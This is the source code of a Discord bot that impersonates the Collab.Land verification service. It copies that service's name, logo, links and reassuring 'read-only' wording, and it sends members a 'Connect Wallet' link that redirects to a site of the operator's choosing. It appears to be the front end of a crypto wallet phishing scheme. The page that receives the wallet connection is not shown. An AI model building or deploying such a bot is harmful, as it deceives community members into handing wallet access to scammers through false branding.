const { 
  Client, 
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  SlashCommandBuilder,
  Events,
  PermissionsBitField
} = require('discord.js');

// ===== CONFIG – read from environment variables =====
// ────────────────────────────────────────────────
const TOKEN        = process.env.DISCORD_TOKEN;
const CLIENT_ID    = process.env.CLIENT_ID;
const REDIRECT_URI = process.env.REDIRECT_URI;

const GUILD_ID     = process.env.GUILD_ID; // optional – remove or leave empty for global commands

// You can upload your own image and use its URL (or keep this one)
const COLLAB_PFP_URL = 'https://i.imgur.com/opTOeER.png';

// Colors used in embeds
const ORANGE = '#e67e22';
const RED    = '#e74c3c';

// Fallback / safety check (only useful for local dev)
if (!TOKEN) {
  console.error("DISCORD_TOKEN is missing! Set it in .env or Railway variables.");
  process.exit(1);
}
if (!CLIENT_ID) {
  console.error("CLIENT_ID is missing! Set it in .env or Railway variables.");
  process.exit(1);
}
if (!REDIRECT_URI) {
  console.error("REDIRECT_URI is missing! Set it to your Railway URL + /callback");
  process.exit(1);
}

// ────────────────────────────────────────────────

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

client.once(Events.ClientReady, async () => {
  console.log(`Logged in as ${client.user.tag}`);

  // Register slash command /verify
  const verifyCmd = new SlashCommandBuilder()
    .setName('verify')
    .setDescription('Post the collab.land-style verification panel');

  try {
    if (GUILD_ID) {
      // Guild-specific (faster, recommended for testing)
      await client.application.commands.create(verifyCmd, GUILD_ID);
      console.log(`/verify command registered in guild ${GUILD_ID}`);
    } else {
      // Global registration – takes up to 1 hour to appear
      await client.application.commands.create(verifyCmd);
      console.log(`/verify command registered globally (may take up to 1h)`);
    }
  } catch (err) {
    console.error("Failed to register slash command:", err);
  }
});

// Sends the main verification panel
async function sendVerifyEmbed(channel) {
  if (channel.type !== ChannelType.GuildText && channel.type !== ChannelType.GuildAnnouncement) {
    console.log("Cannot send to non-text channel");
    return false;
  }

  const mainEmbed = new EmbedBuilder()
    .setColor(ORANGE)
    .setAuthor({
      name: 'Collab.Land',
      iconURL: COLLAB_PFP_URL
    })
    .setTitle('**Verify your assets**')
    .setDescription(
      'This is a read-only connection. Do not share your private keys.\n' +
      'We will never ask for your seed phrase. We will never DM you.'
    )
    .setThumbnail(COLLAB_PFP_URL);

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('verify_letsgo')
      .setLabel("Let's go!")
      .setStyle(ButtonStyle.Primary),

    new ButtonBuilder()
      .setLabel('Docs')
      .setURL('https://dev.collab.land/')
      .setStyle(ButtonStyle.Link),

    new ButtonBuilder()
      .setLabel('Donate')
      .setURL('https://donate.collab.land/')
      .setStyle(ButtonStyle.Link)
  );

  try {
    await channel.send({
      embeds: [mainEmbed],
      components: [row]
    });
    return true;
  } catch (err) {
    console.error("Failed to send verification embed:", err);
    return false;
  }
}

client.on(Events.InteractionCreate, async interaction => {
  // Slash command /verify
  if (interaction.isChatInputCommand() && interaction.commandName === 'verify') {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      return interaction.reply({
        content: 'You need **Manage Messages** permission to use this command.',
        ephemeral: true
      });
    }

    await interaction.deferReply({ ephemeral: true });

    const success = await sendVerifyEmbed(interaction.channel);

    if (success) {
      await interaction.editReply({
        content: 'Verification panel posted successfully!'
      });
    } else {
      await interaction.editReply({
        content: 'Failed to post verification panel — check bot permissions and console.'
      });
    }
  }

  // Button "Let's go!"
  if (interaction.isButton() && interaction.customId === 'verify_letsgo') {
    await interaction.deferReply({ ephemeral: true });

    const member = interaction.member;
    const guild  = interaction.guild;
    const timestamp = new Date().toISOString();
    const interactionId = interaction.id;
    const communityName = guild.name || 'Your Community';

    const instrEmbed = new EmbedBuilder()
      .setColor(RED)
      .setTitle('**Please read instructions carefully before connecting**')
      .setDescription(
        'Use this custom link to connect (valid for 5 minutes)\n\n' +
        `**Guild:** ${guild.id} | **Member:** ${member.id}\n\n` +
        'You should expect to sign the following message when prompted:\n\n' +
        '```' +
        `Collab.Land asks you to sign this message for the purpose of verifying your account ownership. This is READ-ONLY access and will NOT trigger any blockchain transactions or incur any fees.\n\n` +
        `- Community: ${communityName}\n` +
        `- User: ${member.user.tag}\n` +
        `- Discord Interaction: ${interactionId}\n` +
        `- Timestamp: ${timestamp}\n\n` +
        '```' +
        '**Make sure you sign the EXACT message and NEVER share your seed phrase or private key.**'
      );

    const stateData = {
      user_id: member.user.id,
      guild_id: guild.id,
      guild_name: guild.name,
      user_name: member.user.username,
      user_avatar_hash: member.user.avatar || '',
      server_avatar_hash: guild.icon || ''
    };

    const encodedState = encodeURIComponent(JSON.stringify(stateData));

    const oauthUrl = `https://discord.com/oauth2/authorize?` +
      `client_id=${CLIENT_ID}&` +
      `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
      `response_type=code&` +
      `scope=identify&` +
      `state=${encodedState}`;

    const connectRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('Connect Wallet')
        .setURL(oauthUrl)
        .setStyle(ButtonStyle.Link)
    );

    await interaction.editReply({
      embeds: [instrEmbed],
      components: [connectRow],
      ephemeral: true
    });
  }
});

// Optional: !verify prefix command
client.on(Events.MessageCreate, async message => {
  if (message.author.bot) return;
  if (!message.content.toLowerCase().startsWith('!verify')) return;

  if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
    return message.reply({ content: 'You need Manage Messages permission.' });
  }

  const success = await sendVerifyEmbed(message.channel);

  if (success) {
    await message.reply({ content: 'Verification panel posted!' });
  } else {
    await message.reply({ content: 'Failed to post panel — check permissions.' });
  }
});

client.login(TOKEN);
